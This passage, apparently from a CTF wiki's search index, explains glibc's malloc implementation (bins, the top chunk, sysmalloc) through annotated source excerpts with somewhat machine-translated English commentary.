)(); } } Handling discontinuous memory \u00b6 /* handle non-contiguous cases */ else { if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) /* MORECORE/mmap must correctly align */ assert ((( unsigned long ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ) == 0 ); else { front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ aligned_brk += MALLOC_ALIGNMENT - front_misalign ; } } /* Find out current end of memory */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { snd_brk = ( char * ) ( MORECORE ( 0 )); } } Adjustment \u00b6 /* Adjust top based on results of second sbrk */ if ( snd_brk != ( char * )( MORECORE_FAILURE )) { av -> top = ( mchunkptr ) aligned_brk ; set_head ( av -> top , ( snd_brk - aligned_brk + correction ) | PREV_INUSE ); av -> system_mem + = correction ; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if ( old_size != 0 ) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = ( old_size - 4 * SIZE_SZ ) & ~ MALLOC_ALIGN_MASK ; set_head ( old_top , old_size | PREV_INUSE ); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), ( 2 * SIZE_SZ ) | PREV_INUSE ); /* If possible, release the rest. */ if ( old_size >= MINSIZE ) { _int_free ( av , old_top , 1 ); } } } } It should be noted that here the program releases the old top chunk, and it will enter different bins or tcaches depending on the size. Update maximum memory \u00b6 if (( unsigned long ) av -> system_mem > ( unsigned long ) ( av -> max_system_mem )) av -> max_system_mem = av -> system_mem ; check_malloc_state ( av ); Allocating memory blocks \u00b6 Get the size \u00b6 /* finally, do the allocation */ p = av -> top ; size = chunksize ( p ); \u5207\u5206 top \u00b6 /* check that one of the above allocation paths succeeded */ if (( unsigned long )( size ) >= ( unsigned long )( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( p , nb ); av -> top = remainder ; set_head ( p , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , p , nb ); return chunk2mem ( p ); } Capture all errors \u00b6 /* catch all failure paths */ __set_errno ( ENOMEM ); return 0 ;","title":"Allocate Heap Memory"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#apply-for-a-memory-block","text":"","title":"Apply for a memory block"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#__libc_malloc","text":"In general, we will use the malloc function to apply for a block of memory, but when we look closely at the source implementation of glibc, there is actually no malloc function. In fact, the function actually calls the __libc_malloc function. Why not just write a malloc function directly, because sometimes we may need different names. In addition, the __libc_malloc function is simply used to simply wrap the _int_malloc function. _int_malloc is the core of the application memory block. Let's take a closer look at the specific implementation. This function first checks if there is a hook function (__malloc_hook) for the memory allocation function. This is mainly used for user-defined heap allocation functions, which is convenient for users to quickly modify and evaluate the allocation function. It should be noted here that the user-applied byte becomes an unsigned integer once it enters the application memory function. // wapper for int_malloc void * __libc_malloc ( size_t bytes ) { mstate ar_ptr ; void * victim ; // Check if there is a memory allocation hook, if so, call the hook and return. void * ( * hook )( size_t , const void * ) = atomic_forced_read ( __malloc_hook ); if ( __builtin_expect ( hook != NULL , 0 )) return ( * hook )( bytes , RETURN_ADDRESS ( 0 )); Then I will look for an arena to try to allocate memory. arena_get ( ar_ptr , bytes ); Then call the _int_malloc function to request the corresponding memory. victim = _int_malloc ( ar_ptr , bytes ); If the allocation fails, ptmalloc will try to find another available arena and allocate memory. /* Retry with another arena only if we were able to find a usable arena before. */ if ( ! victim && ar_ptr != NULL ) { LIBC_PROBE ( memory_malloc_retry , 1 , bytes ); ar_ptr = arena_get_retry ( ar_ptr , bytes ); victim = _int_malloc ( ar_ptr , bytes ); } If you apply for arena, you have to unlock it before you quit. if ( ar_ptr != NULL ) __libc_lock_unlock ( ar_ptr -> mutex ); Determine if the current status meets the following conditions Either didn't apply to memory either mmap memory Either the requested memory must be in its assigned arena assert ( ! victim || chunk_is_mmapped ( mem2chunk ( victim )) || ar_ptr == arena_for_chunk ( mem2chunk ( victim ))); Finally return to memory. return victim ; }","title":"__libc_malloc"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#_int_malloc","text":"_int_malloc is the core function of memory allocation, and its core ideas are as follows It implements different allocation methods in turn according to the memory block size and frequency of use of fastbin chunk, small chunk, large chunk of the user's application. It checks from small to large whether there are corresponding free blocks in different bins to satisfy the memory requested by the user. When all free chunks are not met, it considers the top chunk. The heap allocator will only request the memory block when the top chunk is not satisfied. After entering the function, the function immediately defines a series of variables that you need, and converts the memory size requested by the user to the internal chunk size. static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ unsigned int idx ; /* associated bin index */ mbinptr bin ; /* associated bin */ mchunkptr victim ; /* inspected/selected chunk */ INTERNAL_SIZE_T size ; /* its size */ int victim_index ; /* its bin index */ mchunkptr remainder ; /* remainder from a split */ unsigned long remainder_size ; /* its size */ unsigned int block ; /* bit map traverser */ unsigned int bit ; /* bit map traverser */ unsigned int map ; /* current word of binmap */ mchunkptr fwd ; /* misc temp for linking */ mchunkptr bck ; /* misc temp for linking */ const char * errstr = NULL ; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size ( bytes , nb );","title":"_int_malloc"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#arena","text":"/* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if ( __glibc_unlikely ( av == NULL )) { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; }","title":"arena"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#fast-bin","text":"If the size of the requested chunk is in the fastbin range, note that the comparison here is an unsigned integer . In addition, chunk is taken from the head node of fastbin. /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { // Get the corresponding subscript of fastbin idx = fastbin_index ( nb ); // Get the corresponding pointer to the fastbin mfastbinptr * fb = & fastbin ( av , idx ); mchunkptr pp = * fb ; // Use fd to traverse the corresponding bin whether there are free chunks, do { victim = pp ; if ( victim == NULL ) break ; } while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); // There are chunks that can be used if ( victim != 0 ) { // Check if the chunk size retrieved is consistent with the corresponding fastbin index. // Calculate its size using chunksize based on the obtained victim. // Calculate the index of the chunk using fastbin_index. if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } // Careful inspection. . Useful only when DEBUG check_remalloced_chunk ( av , victim , nb ); // Convert the obtained chunk to mem mode void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } }","title":"fast bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#small-bin","text":"If the range of the obtained memory block is in the range of the small bin, then the following process is performed. /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // Get the index of the small bin idx = smallbin_index ( nb ); // Get the corresponding chunk pointer in the small bin bin = bin_at ( av , idx ); // first execute victim = last(bin) to get the last chunk of the small bin // If victim = bin , then the bin is empty. // If they are not equal, then there will be two cases if (( victim = last ( bin )) != bin ) { // In the first case, the small bin has not yet been initialized. if ( victim == 0 ) /* initialization check */ // Perform initialization to merge chunks in fast bins malloc_consolidate ( av ); // In the second case, there is a free chunk in the small bin else { // Get the second-to-last chunk in the small bin. bck = victim -> bk ; // Check if bck->fd is victim, prevent forgery if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // Set the corresponding inuse bit of victim set_inuse_bit_at_offset ( victim , nb ); // Modify the small bin list, take the last chunk of the small bin bin -> bk = bck ; bck -> fd = bin ; // If it is not main_arena, set the corresponding flag if ( av != & main_arena ) set_non_main_arena ( victim ); // Detailed inspection, non-debug status has no effect check_malloced_chunk ( av , victim , nb ); // Convert the requested chunk to the corresponding mem state void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } }","title":"small bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#large-bin","text":"When the chunks in the fast bin and small bin cannot satisfy the user request chunk hour, it will consider whether it is a large bin. However, in the large bin, there is no direct scan of the chunk in the corresponding bin. Instead, the malloc_consolidate(see malloc_state related function) function is used to process the chunk in the fast bin, and the chunks that may be merged are merged and then placed. In the unsorted bin, if you can't merge, put it directly into the unsorted bin, and then process it in the big loop below. Why not just take the large chunk directly from the corresponding bin? This is the mechanism of ptmalloc, which merges fragment chunks in the heap before allocating large chunks to reduce fragmentation in the heap. /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // Get the subscript of the large bin. idx = largebin_index ( nb ); // If there is fastbin, it will handle fastbin if ( have_fastchunks ( av )) malloc_consolidate ( av ); }","title":"large bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#big-loop-traversing-unsorted-bin","text":"**If the program is executed here, it means that there is no chunk in the bin (fast bin, small bin) that is exactly the same as the chunk size, which can directly satisfy the demand, but the large chunk is processed in this big loop. In the next cycle, the main operations are as follows Take the chunks in the unsorted bin one by one in the FIFO mode If it is a small request, consider whether it is just satisfied, if it is, return directly. If not, put it in the corresponding bin. Try to allocate the memory required by the user from the large bin This part is a big loop, this is to try to redistribute the small bin chunk, because we will first use the large bin, top chunk to try to satisfy the user's request, but if it is not satisfied, because we did not assign it successfully Small bin, we didn't merge the chunks in the fast bin, so we'll merge the fast bin chunks and use a big loop to try to allocate the small bin chunk again. /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0 ;","title":"Big loop - traversing unsorted bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#unsorted-bin-traversing","text":"Consider the unsorted bin first, then consider the last remainder, but there are exceptions to the request for the small bin chunk. Note that the traversal order of unsorted bin is bk. // If the unsorted bin is not empty // First In First Out while (( victim = unsorted_chunks ( av ) -> bk ) ! = unsorted_chunks ( av )) { // victim is the last chunk of unsorted bin // bck is the penultimate chunk of unsorted bin bck = victim -> bk ; // Determine whether the obtained chunk meets the requirements, can not be too small, can not be too large // The size of the general system_mem is 132K if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); // Get the chunk size corresponding to the victim. size = chunksize ( victim );","title":"unsorted bin Traversing"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#small-request","text":"If the user's request is a small bin chunk, then we first consider the last remainder. If the last remainder is the only one in the unsorted bin, and the size of the last remainder is enough to be a chunk, why is there no equal sign**? /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ // Get the size of the new retriever remainder_size = size - nb ; // Get the location of the new retriever remainder = chunk_at_offset ( victim , nb ); // update the unsorted bin unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; // update the last_remainder recorded in av av -> last_remainder = remainder ; // Update the pointer of the last remainder remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // Set the victim's head, set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); // Set the head of the remainder set_head ( remainder , remainder_size | PREV_INUSE ); // Set the prev_size field of the record remainder size because the retriever is idle at this time. set_foot ( remainder , remainder_size ); // Detailed inspection, no effect in non-debug mode check_malloced_chunk ( av , victim , nb ); // Convert victim from chunk mode to mem mode void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; }","title":"small request"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#initial-take-out","text":"/* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av );","title":"Initial take out"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#exact-fit","text":"If the chunk size taken from the unsorted bin is just right, use it directly. Here we should have allocated the appropriate chunks after the merger. /* Take now instead of binning if exact fit */ if ( size == nb ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; }","title":"exact fit"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#place-chunk-in-small-bin","text":"Put the extracted chunk into the corresponding small bin. /* place chunk in bin */ if ( in_smallbin_range ( size )) { victim_index = smallbin_index ( size ); bck = bin_at ( av , victim_index ); fwd = bck -> fd ;","title":"place chunk in small bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#place-chunk-in-large-bin","text":"Put the fetched chunks into the corresponding large bin. } else { // large bin range victim_index = largebin_index ( size ); bck = bin_at ( av , victim_index ); // the head of the current large bin fwd = bck -> fd ; /* maintain large bins in sorted order */ /* From here we can conclude that largebin is sorted in descending order by fd_nextsize. The same size chunk, later will only be inserted into the same size chunk before. It is easy to understand without modifying the same size fd/bk_nextsize. Can reduce overhead. In addition, the bin header does not participate in the nextsize link. */ // If the large bin list is not empty if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ // Accelerate comparisons, not only should this be considered, because the chunks in the list will set this bit. size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ // bck->bk stores the smallest chunk in the corresponding large bin. // If the traversed chunk is smaller than the current minimum, then it only needs to be inserted at the end of the list. // Determine if bck->bk is in main arena. assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { // Let fwd point to the big bin header fwd = bck ; // Let bck point to the largin bin tail chunk bck = bck -> bk ; // victim's fd_nextsize points to the first chunk of largin bin victim -> fd_nextsize = fwd -> fd ; // victim's bk_nextsize points to the bk_nextsize pointed to by the first chunk of the original list. victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; // The bk_nextsize of the first chunk of the original list points to the victim // The original fd_nextsize pointing to the first chunk of the list points to victim fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { // The size of the victim currently being inserted is larger than the smallest chunk // Determine if fwd is in main arena assert ( chunk_main_arena ( fwd )); // Start from the head of the list to find a chunk that is no bigger than the victim. while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } // If you find a chunk that is as big as the victim, // Then insert the chunk directly after the chunk and don't modify the nextsize pointer. if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { // If the chunk found is not the same size as the current victim // Then you need to construct a nextsize doubly linked list. victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else // If it is empty, simply make fd_nextsize and bk_nextsize form a doubly linked list. victim -> fd_nextsize = victim -> bk_nextsize = victim ; }","title":"place chunk in large bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#final-take-out","text":"// Put it in the corresponding bin to form bck<-->victim<-->fwd. mark_bin ( av , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ;","title":"Final take out"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#while-iterations","text":"While exits up to 10,000 iterations and exits. // # define MAX_ITERS 10000 if ( ++ iters >= MAX_ITERS ) break ; }","title":"while Iterations"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#large-chunk","text":"Note: It may be very strange, why not go to see if the small chunk meets the new requirements first? This is because the small bin has already been judged before the loop. If there is one, the chunk will appear after the merge. But outside the big loop, the large chunk simply finds its index, so it feels reasonable to judge directly here, and also to find larger chunks for the following. If the requested chunk is in the large chunk range, it is scanned from small to large in the corresponding bin to find the first one. /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if ( ! in_smallbin_range ( nb )) { bin = bin_at ( av , idx ); /* skip scan if empty or largest chunk is too small */ // If the corresponding bin is empty or the chunks in it are the smallest, skip it // first(bin)=bin->fd means the largest chunk in the current list. if (( victim = first ( bin )) != bin && ( unsigned long ) chunksize_nomask ( victim ) >= ( unsigned long ) ( nb )) { // Reverse traversing the list until the first chunk is found that is not less than the desired chunk size victim = victim -> bk_nextsize ; while ((( unsigned long ) ( size = chunksize ( victim )) < ( unsigned long ) ( nb ))) victim = victim -> bk_nextsize ; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // If the final chunk is not the last chunk in the bin, and the chunk is in front of the chunk // The size is the same, then we take the chunk in front of it, so we can avoid adjusting bk_nextsize, fd_nextsize // linked list. Because only one chunk of the same size will be chained to the nextsize chain. if ( victim != last ( bin ) && chunksize_nomask ( victim ) == chunksize_nomask ( victim -> fd )) victim = victim -> fd ; // Calculate the remaining size after the allocation remainder_size = size - nb ; // unlink unlink ( av , victim , bck , fwd ); /* Exhaust */ // The remaining size is not enough to be a block // Very curious what will happen next? if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // The remaining size can also be split as a chunk. else { // Get the pointer to the remaining chunk, called the reducer remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // Insert in unsorted bin bck = unsorted_chunks ( av ); fwd = bck -> fd ; // Determine if the unsorted bin is destroyed. if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; // If it is not in the range of small bin, set the corresponding field if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // Set the flag of the assigned chunk set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); // Set the last chunk of the remainder, that is, the usage status of the allocated chunk // The rest of the rules are inherited directly from above. set_head ( remainder , remainder_size | PREV_INUSE ); // Set the size of the remainder set_foot ( remainder , remainder_size ); } // an examination check_malloced_chunk ( av , victim , nb ); // Convert to mem state void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } }","title":"large chunk"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#looking-for-a-larger-chunk","text":"If you get here, it means that for the chunks that the user needs, you can't get the chunk directly from the corresponding bin, so we need to find the faster bin, small bin or large bin larger than the current bin. /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++ idx ; // Get the corresponding bin bin = bin_at ( av , idx ); // Get the current index in the binmap block index // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap is managed by block. Each block is an int with a total of 32 bits. It can indicate whether there are free chunks in 32 bins. // So here is the right shift 5 block = idx2block ( idx ); // Get the mapping corresponding to the current block size, here you can know whether there is a free block in the corresponding bin map = av -> binmap [ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // Set the bit corresponding to idx to 1, and the other bits to 0. bit = idx2bit ( idx ); for (;;) {","title":"Looking for a larger chunk"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#find-a-suitable-map","text":"/* Skip rest of block if there are no more set bits in this block. */ // If bit>map, it means that there is no free block in the map that is larger than the current required chunk. // If the bit is 0, then the parameter brought by idx2bit above is 0. if ( bit > map || bit == 0 ) { do { // Find the next block until its corresponding map is not 0. // If it doesn't exist, you can only use the top chunk. if ( ++ block >= BINMAPSIZE ) /* out of bins */ goto use_top ; } while (( map = av -> binmap [ block ]) == 0 ); // Get its corresponding bin, because the chunk size in the map is larger than the required chunk, and // map itself is not 0, so there must be a chunk that meets the requirements. bin = bin_at ( av , ( block << BINMAPSHIFT )); bit = 1 ; }","title":"Find a suitable map"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#find-the-right-bin","text":"/* Advance to bin with set bit. There must be one. */ // Find from the smallest bin of the current map until you find the appropriate bin. // This is definitely there. while (( bit & map ) == 0 ) { bin = next_bin ( bin ); bit <<= 1 ; assert ( bit != 0 ); }","title":"Find the right bin"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#simple-check-chunk","text":"/* Inspect the bin. It is likely to be non-empty */ // Get the corresponding bin victim = last ( bin ); /* If a false alarm(empty bin), clear the bit. */ // If victim=bin, then we clear the bit corresponding to the map to 0 and then get the next bin. // The probability of this happening should be small. if ( victim == bin ) { av -> binmap [ block ] = map &= ~ bit ; /* Write through */ bin = next_bin ( bin ); bit <<= 1 ; }","title":"Simple check chunk"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#really-take-out-chunk","text":"else { // Get the size of the corresponding victim size = chunksize ( victim ); /* We know the first chunk in this bin is big enough to use. */ assert (( unsigned long ) ( size ) >= ( unsigned long ) ( nb )); // Calculate the remaining size after splitting remainder_size = size - nb ; /* unlink */ unlink ( av , victim , bck , fwd ); /* Exhaust */ // What if there is not enough chunk after splitting? if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // If enough, despite the segmentation else { // Calculate the offset of the remaining chunk remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // Insert the remaining chunks into the unsorted bin bck = unsorted_chunks ( av ); fwd = bck -> fd ; if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks 2\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; /* advertise as last remainder */ // If it is in the range of small bin, mark it as a remainder if ( in_smallbin_range ( nb )) av -> last_remainder = remainder ; if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // Set the use status of the victim set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); // Set the usage status of the remainder. Why is this? set_head ( remainder , remainder_size | PREV_INUSE ); // Set the size of the remainder set_foot ( remainder , remainder_size ); } // an examination check_malloced_chunk ( av , victim , nb ); // The chunk state is converted to the mem state. void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; }","title":"Really take out chunk"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#using-top-chunk","text":"If all the chunks in the bin have no way to directly meet the requirements (that is, not merged), or there are no free chunks. Then we can only use the top chunk. use_top : /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // Get the current top chunk and calculate its corresponding size victim = av -> top ; size = chunksize ( victim ); // If the top chunk size still satisfies the minimum size of chunk after splitting, then you can split directly. if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; // Here, set PREV_INUSE because if the previous chunk of the top chunk is bound to be fastbin, // The top chunk will merged, so PREV_INUSE is set here. set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } // Otherwise, determine if there is a fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if ( have_fastchunks ( av )) { // Perform a fast bin merge first malloc_consolidate ( av ); /* restore original bin index */ // Determine whether the required chunk is in the range of small bin or large bin // and calculate the corresponding index // Wait for the next time to see if you can if ( in_smallbin_range ( nb )) idx = smallbin_index ( nb ); else idx = largebin_index ( nb ); }","title":"Using top chunk"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#heap-memory-is-not-enough","text":"If the heap memory is not enough, we need to use sysmalloc to apply for memory. /* Otherwise, relay to handle system-dependent cases */ // Otherwise, we can only apply for a bit of memory from the system again. else { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; }","title":"Heap memory is not enough"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#_libc_calloc","text":"Calloc is also a function in libc that requests memory blocks. The package in libc is _libc_calloc , which is described below. /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void * __libc_calloc ( size_t , size_t );","title":"_libc_calloc"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#sysmalloc","text":"As the comment in the function header says, this function is used to request more memory from the system when the current heap is out of memory. /* sysmalloc handles malloc cases requiring more memory from the system. On entry, it is assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. */","title":"sysmalloc"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#basic-definition","text":"static void * sysmalloc ( INTERNAL_SIZE_T nb , mstate av ) { mchunkptr old_top ; /* incoming value of av->top */ INTERNAL_SIZE_T old_size ; /* its size */ char * old_end ; /* its end address */ long size ; /* arg to first MORECORE or mmap call */ char * brk ; /* return value from MORECORE */ long correction ; /* arg to 2nd MORECORE call */ char * snd_brk ; /* 2nd return val */ INTERNAL_SIZE_T front_misalign ; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign ; /* partial page left at end of new space */ char * aligned_brk ; /* aligned offset into brk */ mchunkptr p ; /* the allocated/returned chunk */ mchunkptr remainder ; /* remainder frOm allocation */ unsigned long remainder_size ; /* its size */ size_t pagesize = GLRO ( dl_pagesize ); bool tried_mmap = false ; We can mainly focus on pagesize , which #ifndef EXEC_PAGESIZE #define EXEC_PAGESIZE 4096 #endif # define GLRO(name) _##name size_t _dl_pagesize = EXEC_PAGESIZE ; So, pagesize=4096=0x1000 .","title":"Basic definition"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#consider-mmap","text":"As stated in the opening comment, if any of the following conditions are met There is no heap allocated. If the requested memory is larger than mp_.mmap_threshold and the number of mmap is less than the maximum value, you can try to use mmap. By default, the threshold is static struct malloc_par mp_ = { . top_pad = DEFAULT_TOP_PAD , . n_mmaps_max = DEFAULT_MMAP_MAX , . mmap_threshold = DEFAULT_MMAP_THRESHOLD , . trim_threshold = DEFAULT_TRIM_THRESHOLD , #define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8)) . arena_test = NARENAS_FROM_NCORES ( 1 ) #if USE_TCACHE , . tcache_count = TCACHE_FILL_COUNT , . tcache_bins = TCACHE_MAX_BINS , . tcache_max_bytes = tidx2usize ( TCACHE_MAX_BINS - 1 ), . tcache_unsorted_limit = 0 /* No limit. */ #endif }; DEFAULT_MMAP_THRESHOLD is 128*1024 bytes, or 128 K. #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif /* 